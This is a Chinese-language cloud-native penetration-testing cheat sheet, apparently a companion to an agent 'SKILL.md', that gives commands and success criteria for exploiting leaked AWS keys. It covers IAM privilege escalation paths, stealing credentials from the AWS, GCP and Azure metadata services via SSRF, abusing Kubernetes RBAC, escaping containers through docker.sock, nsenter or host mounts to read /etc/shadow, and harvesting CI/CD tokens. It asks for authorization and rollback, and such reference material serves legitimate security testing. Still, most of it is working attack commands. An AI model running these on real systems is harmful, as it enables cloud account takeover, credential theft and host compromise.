# 云原生速查（命令 + 判据）

> 配套 `SKILL.md`。仅在授权账号/集群/订阅内操作。占位符：`<profile>`、`<region>`、`<cluster>`、`<ns>`、`<sa>`、`<image>`。

## 0. 环境与证据

```bash
mkdir -p work/<case>/{cloud,k8s,container,ci}
date -Is | tee work/<case>/run.start
aws --version; kubectl version --client; trivy --version
```

所有云调用先记录身份与区域，避免误打其他账号：

```bash
aws sts get-caller-identity --profile <profile> | tee work/<case>/cloud/whoami.json
aws configure get region --profile <profile>
```

## 1. AK-SK 泄露利用

### 1.1 身份与权限面

```bash
export AWS_PROFILE=<profile>
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name <user>
aws iam list-user-policies --user-name <user>
aws iam get-user
# 角色路径
aws iam list-attached-role-policies --role-name <role>
aws iam list-role-policies --role-name <role>
```

只读资源快查（控制条数，避免审计噪音）：

```bash
aws s3 ls
aws ec2 describe-instances --max-items 5 --region <region>
aws lambda list-functions --max-items 10 --region <region>
aws secretsmanager list-secrets --max-items 10 --region <region>
```

### 1.2 常见提权面

| 权限 | 用法 |
|---|---|
| `iam:CreatePolicyVersion` | 建新策略版本挂管理员权限 |
| `iam:AttachUserPolicy` / `AttachRolePolicy` | 直接挂 AdministratorAccess |
| `iam:PassRole` + `lambda:CreateFunction` | 传高权角色给函数执行 |
| `iam:PassRole` + `ec2:RunInstances` | 起带高权实例角色的机器 |
| `sts:AssumeRole` | 横向到其他角色/账号 |
| `s3:GetObject` | 拿配置、备份、tfstate 中的下一跳凭据 |

判据：`sts get-caller-identity` 返回的 ARN 权限级别发生变化（低权用户 → 角色/管理员），或拿到可用的下一跳凭据。

### 1.3 只读优先

```bash
# 不要批量下载；先看元数据与大小
aws s3api head-object --bucket <bucket> --key <key>
aws s3api list-objects-v2 --bucket <bucket> --max-items 20
```

判据：能证明对象可读（head/list 成功）即可作为证据；批量导出需要额外授权。

### 1.4 四步链：泄露 → 身份 → 枚举 → 提权（每步可机检）

| 步 | 命令（只读） | 通过判据（可机检） | 失败判据 | 产物/代价 |
| :-- | :-- | :-- | :-- | :-- |
| 0 泄露定位 | `grep -RnE 'AKIA[A-Z0-9]{16}\|ASIA[A-Z0-9]{16}' <repo>`；`stat -c '%a %n' ~/.aws/credentials` | 命中处有明文 secret（不仅是 AK）、文件权限过宽或已入 git 历史 | 占位符/示例 key、只有 access_key 无 secret、`.env.example` | 低；只记录路径/commit/指纹 |
| 1 身份 | `AWS_PROFILE=<p> aws sts get-caller-identity`（或显式三变量） | 返回 `UserId`/`Account`/`Arn`；ARN 能区分 user/assumed-role | `InvalidClientTokenId`/`ExpiredToken`/`SignatureDoesNotMatch` → 凭据无效，停 | 低；STS 会进 CloudTrail |
| 2 枚举 | `aws iam list-attached-user-policies`、`list-user-policies`、`list-groups-for-user`、`list-attached-role-policies`、`list-role-policies`、`get-account-authorization-details` | 能拿到策略文档本体（`PolicyVersion.Document`）与 trust policy；资源类 `describe-*`/`list-*` 至少一类成功 | 只有 `List*` 无 `Get*`；全 AccessDenied → 权限面 `unknown`，不猜 | 中：`list-users`/`get-account-authorization-details` 在大账号噪声大 |
| 3 提权匹配 | `python Tool/skill/_pending/ad-cloud/scripts/cloud-iam-eval.py --input policy.json --action <Action> --resource <ARN> --json`；PMapper/`enumerate-iam` | `decision=allow` + `privesc[].severity` + `matched[].policy` 指向具体语句；boundary/SCP 未拦 | 显式 `Deny`/boundary 不含该 action/条件无法满足 → `blocked` | 离线零噪声；在线 `simulate-principal-policy` 也属只读 |
| 4 最小验证 | 先用只读 API 证权（`get-user`、`describe-*`、`get-secret-value --version-stage AWSCURRENT` 若已授权） | 低影响 API 返回 200 且响应字段与策略一致 | 文本 allow 但 API `AccessDenied` → 条件 key 未满足或 SCP 拦，转 blocked | 写操作（建策略/建 key/PassRole）单独授权单 |

> 脚本只算“文本 allow”；`boundary`/SCP/资源策略/条件键未建模时结论最高 `candidate`。
> 输出字段读法：`decision`（allow/deny）、`privesc[].severity`、`matched[]`、`deny_statements[]`。

### 1.5 提权路径逐条判据（CreatePolicyVersion / PassRole / AssumeRole）

| 路径 | 前置权限 | 最小验证（先只读） | 可机检判据 | 失败判据 | 代价 |
| :-- | :-- | :-- | :-- | :-- | :-- |
| `iam:CreatePolicyVersion` | 对某个已附加策略有权限；或对自身 inline/attached policy | `cloud-iam-eval --action iam:CreatePolicyVersion`；`aws iam list-policy-versions --policy-arn <arn>` | eval `decision=allow` + `privesc.severity=critical`；实际调用返回 `PolicyVersion` 且 `IsDefault=false` | 显式 Deny、boundary 不含该 action、`SetAsDefault` 被拒 | 高：新版本可回滚删除；必须记录版本号并 `delete-policy-version` |
| `iam:SetDefaultPolicyVersion` | 目标策略已有旧管理员版本 | `list-policy-versions` 看历史版本 | 存在旧版本且当前主体能 set-default；调用后权限变化可复现 | 无旧版本、版本已被删、boundary 拦 | 中高；可回切 |
| `iam:AttachUserPolicy` / `PutUserPolicy` | 对自身/可控用户 | `list-attached-user-policies`；eval 对应 action | 挂载后 `get-caller-identity` 不变但新 API 成功（权限面扩大） | `EntityAlreadyExists`、boundary 截断、SCP 拦 | 高：必须 `detach-user-policy` 回滚 |
| `iam:PassRole` + `lambda:CreateFunction`/`InvokeFunction` | PassRole 到高权角色 + 建/调函数 | `get-role --role-name <r>` 看 trust 与 attached；`list-functions` | 函数 `Role` 指向高权角色，且能建后调用返回受控输出（如 `get-caller-identity` 的 ARN） | trust 的 Principal 不含 lambda、函数创建被拒、VPC/权限边界拦 | 高：计费 + 代码残留；必须删函数 |
| `iam:PassRole` + `ec2:RunInstances` | PassRole 到实例配置文件 + RunInstances | `describe-instance-profiles`；`get-role` | 实例以高权 profile 启动，IMDS 取到的 ARN 为目标角色 | 无实例 profile、AMI/子网受限、SCP 拦 | 极高：计费 + 实例残留；必须 terminate |
| `iam:PassRole` + `cloudformation:CreateStack` | PassRole + 建栈 | `list-stacks` 看现有 stack role 模式 | 栈以高权角色创建并输出受控资源 | 模板校验失败、权限边界、服务角色不存在 | 高：栈/资源残留，必须 delete-stack |
| `sts:AssumeRole` | 目标角色 trust 允许当前主体 | `get-role --role-name <r>` 读 `AssumeRolePolicyDocument`（Principal/ExternalId/条件） | `assume-role` 返回 `Credentials`，再 `get-caller-identity` ARN 变为目标角色 | trust 限定其他账号/需 `ExternalId`/需 MFA → 不成立 | 低：只产生临时会话，入 CloudTrail |
| `iam:UpdateAssumeRolePolicy` | 能改目标角色 trust | `get-role` 读原 trust（先备份） | 改写后 `assume-role` 成功；回读 trust 含当前主体 | 无写权限、SCP/边界拦、角色被保护 | 极高：改信任关系会影响所有使用者；必须回写原文档 |
| `iam:CreateAccessKey` | 对目标用户有权限 | `list-access-keys --user-name <u>`（只读） | 新建 key 后 `get-caller-identity` 为该用户；记录 key id 指纹 | 每用户 2 key 上限、MFA 条件、SCP 拦 | 高：必须 `delete-access-key` |
| `cognito-identity:GetId` → `GetCredentialsForIdentity`（未认证身份池） | 无（需 IdentityPoolId） | `get-id --no-sign-request` → `get-credentials-for-identity --no-sign-request` | 匿名拿到 ASIA 临时凭据 + `get-caller-identity` 返回 `Cognito_<Pool>Unauth_Role` | `NotAuthorizedException`（未开未认证身份）→ 不可利用 | 低：匿名调用，但需说明数据影响面 |

判据统一：**前置权限在策略文本中 allow（且 boundary/SCP 不拦）+ 至少一个只读 API 已证权 +
提权动作有可回滚证据**。只有策略文本 allow 时写 `candidate`，不得写“已提权”。

### 1.6 失败判据与未建模项（看到就降级）

| 现象 | 判定 | 改走 | 代价 |
| :-- | :-- | :-- | :-- |
| `AccessDenied` 但策略文本 allow | 条件键（`aws:PrincipalArn`/`aws:SourceIp`/MFA）或 SCP 未建模 | 补 `conditions_context` 后重跑 eval；或在线 `simulate-principal-policy` | 低 |
| `ExpiredToken`/`InvalidClientTokenId` | 凭据已失效/被轮换 | 找新来源，不拿死 key 写“有效凭据” | 低 |
| 只有 `List*`/`Get*` 只读权限 | 无提权路径 | 转数据面（S3 对象/Secret）或横向到 CI | 低 |
| 角色 trust 需 `ExternalId`/指定账号 | confused-deputy 不成立 | 换角色/换账号，不猜 ExternalId | 低 |
| 组织级 SCP 拒绝整个服务 | 账号层 allow 无效 | 换区域/服务或记 `blocked` | 中（枚举噪声） |
| 权限边界（`boundary`）不含目标 action | 提权被截断 | 找 boundary 内的写权限（如 `s3:PutObject` 打供应链） | 低 |

未建模项必须写进报告：资源策略、`NotAction`/`NotResource`、`aws:PrincipalOrgID`、
permissions boundary 的隐式 deny、SCP 层级、KMS/Secrets 的资源策略。这些都可能把
“文本 allow”变成实际 deny；反之也可能把 `Deny` 覆盖成 allow（显式 deny 优先）。

## 2. 元数据 SSRF

### AWS（IMDSv2）

```bash
TOKEN=$(curl -s -X PUT 'http://169.254.169.254/latest/api/token' \
  -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
```

### GCP

```bash
curl -s -H 'Metadata-Flavor: Google' \
  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'
curl -s -H 'Metadata-Flavor: Google' \
  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes'
```

### Azure

```bash
curl -s -H Metadata:true \
  'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
```

判据：拿到临时凭据（AK-SK-SessionToken / OAuth token）并成功调用身份接口：

```bash
AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... \
  aws sts get-caller-identity
```

只回显 200 或元数据目录不算；必须有可用凭据 + 权限输出。

## 3. K8s RBAC

```bash
kubectl config current-context
kubectl auth can-i --list
kubectl auth can-i --list --as=system:serviceaccount:<ns>:<sa>
kubectl get clusterrolebinding -o wide
kubectl get rolebinding -A -o wide
kubectl get secrets -A
```

- `create pods` / `create daemonsets` / `create jobs` → 可挂宿主路径或特权容器
- `get secrets` → 取 SA token、镜像仓库凭据
- `impersonate` / `bind` / `escalate` → 直接提权到高权角色
- `patch` / `update` 工作负载 → 改现有 Deployment 加挂载

判据：`kubectl auth can-i <verb> <resource>` 返回 `yes`，且能实际创建一个可验证的 Pod/Secret 读取结果。

## 4. 容器逃逸

```bash
id; capsh --print 2>/dev/null; cat /proc/1/cgroup; ls -l /var/run/docker.sock
mount | grep -E 'hostPath|/host|docker.sock|containerd.sock'
```

### 4.1 特权 / CAP_SYS_ADMIN

```bash
# 挂宿主根（只读优先）
mkdir -p /mnt/host && mount --bind / /mnt/host 2>/dev/null || \
  mount -t proc proc /mnt/host/proc
ls /mnt/host
# 或进入宿主命名空间
nsenter -t 1 -m -u -i -n -p -- id
```

### 4.2 Docker / containerd socket

```bash
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock run --rm -it \
  -v /:/host --privileged alpine chroot /host sh
ctr -a /run/containerd/containerd.sock -n k8s.io containers list
```

### 4.3 hostPID / hostPath

```bash
nsenter -t 1 -m -u -i -n -p -- cat /etc/shadow
# hostPath 挂载点通常在 /var/lib/kubelet/pods/... 或自定义 /host
```

### 4.4 其他

- cgroup v1 `release_agent`（需 `CAP_SYS_ADMIN`）
- `CAP_SYS_PTRACE` + 注入宿主进程
- 内核漏洞（按内核版本匹配，勿在生产盲打）

判据：在宿主命名空间执行 `id` 返回宿主身份，或读到宿主 `/etc/shadow` / kubelet 凭据，并给出完整复现命令。

## 5. CI/CD 凭据

```bash
env | grep -Ei 'AWS|AZURE|GCP|TOKEN|SECRET|CI_|GITHUB|GITLAB|DOCKER'
ls -la ~/.aws ~/.docker ~/.config/gcloud 2>/dev/null
cat ~/.docker/config.json 2>/dev/null
git config --list --show-origin | grep -Ei 'url|token'
```

- `GITHUB_TOKEN` / `CI_JOB_TOKEN` 的 scope（能否写仓库、读环境变量）
- Runner 是否共享、能否被 MR/PR 触发
- 制品仓库凭据能否拉取/推送生产镜像
- 云 OIDC 信任策略是否过宽（`sub` 通配）

判据：用 CI token 成功读取受保护环境变量、推送镜像、或 AssumeRole 到部署角色，且有 API 返回。

## 6. 镜像与配置扫描

```bash
trivy image --severity HIGH,CRITICAL <image>
trivy config .
trivy fs --scanners secret .
# 替代
grype <image>; syft <image> -o json
```

判据：命中可利用的 HIGH/CRITICAL（有已知利用链）或明文密钥；仅版本旧不算提权证据。

## 7. 判据复核

1. 凭据可用且可复现（换机器重放仍成功）？
2. 权限提升有客观输出（STS ARN、`auth can-i`、宿主 `id`）？
3. 证据已归档并脱敏（AK/SK 只留指纹与过期时间）？

三条全满足才写"已打穿"；否则写"待验证"并说明缺哪一步。
